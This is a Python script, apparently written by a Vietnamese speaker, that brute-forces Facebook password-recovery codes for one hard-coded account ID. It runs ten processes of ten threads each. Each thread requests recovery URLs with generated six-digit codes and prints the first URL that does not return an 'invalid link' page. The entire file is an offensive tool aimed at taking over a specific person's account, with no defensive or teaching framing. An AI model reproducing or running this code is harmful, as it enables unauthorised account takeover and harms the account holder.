import multiprocessing,requests,os,threading
from bs4 import BeautifulSoup
id_account=('100002923342594')
def r():
    def task_a(x):
        a=x
        b=c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả luồn r')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}---Luồn 1')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r1():
    def task_a(x):
        a=x
        b=1
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r1')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 2')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r2():
    def task_a(x):
        a=x
        b=2
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r2')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luồng 3')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r3():
    def task_a(x):
        a=x
        b=3
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r3')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 3')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r4():
    def task_a(x):
        a=x
        b=4
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r4')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 4')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r5():
    def task_a(x):
        a=x
        b=5
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r5')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 5')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r6():
    def task_a(x):
        a=x
        b=6
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r6')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 6')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r7():
    def task_a(x):
        a=x
        b=7
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r7')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 7')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r8():
    def task_a(x):
        a=x
        b=8
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r8')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 8')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
def r9():
    def task_a(x):
        a=x
        b=9
        c=d=e=f=0
        for f in range (0,10000):
            for f in range (0,10):
                f=f+1
                if f==10:
                    f=0
                    e=e+1
                    if e==10:
                        e=0
                        d=d+1
                        if d==10:
                            d=0
                            c=c+1
                            if c==10:
                                print ('Không tìm ra kết quả---Luồng r9')
                recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
                sp=requests.get(url,timeout=10).text
                html=BeautifulSoup(sp,"html.parser")
                html=html.getText().find('Liên kết không hợp lệ')
                if html==-1:
                    os.system("cls")
                    print (url)
                    quit()
                else:
                    print (f'{recover_pass}--Luôn 9')
    soluong=10
    threads=[]
    for x in range (soluong):
        threads += [threading.Thread(target=task_a,args={x},)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
if __name__ == "__main__":
    p1 = multiprocessing.Process(target=r)
    p2 = multiprocessing.Process(target=r1)
    p3 = multiprocessing.Process(target=r2)
    p4 = multiprocessing.Process(target=r3)
    p5 = multiprocessing.Process(target=r4)
    p6 = multiprocessing.Process(target=r5)
    p7 = multiprocessing.Process(target=r6)
    p8 = multiprocessing.Process(target=r7)
    p9 = multiprocessing.Process(target=r8)
    p10 = multiprocessing.Process(target=r9)
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    p3.start()
    p2.start()
    p1.start()
